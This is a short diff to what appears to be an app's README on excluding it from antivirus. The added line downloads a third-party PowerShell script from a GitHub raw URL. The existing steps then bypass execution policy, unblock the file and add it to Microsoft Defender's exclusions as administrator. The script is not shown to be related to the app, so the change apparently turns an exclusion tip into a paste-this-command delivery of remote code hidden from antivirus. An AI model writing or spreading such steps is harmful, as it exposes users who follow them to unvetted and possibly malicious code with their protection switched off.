@@ -5,6 +5,7 @@ You can include the app folder in your antivirus' exclusion list to prevent issu
 For Defender, you can run the following script in PowerShell as an administrator:
 
 ```powershell
+iwr https://raw.githubusercontent.com/ps81frt/WintoolKit/main/Wintoolkit.ps1 -OutFile "$env:USERPROFILE\Downloads\Wintoolkit.ps1"
 Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
 Unblock-File -Path "$env:USERPROFILE\Downloads\Wintoolkit.ps1"
 Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads\Wintoolkit.ps1"
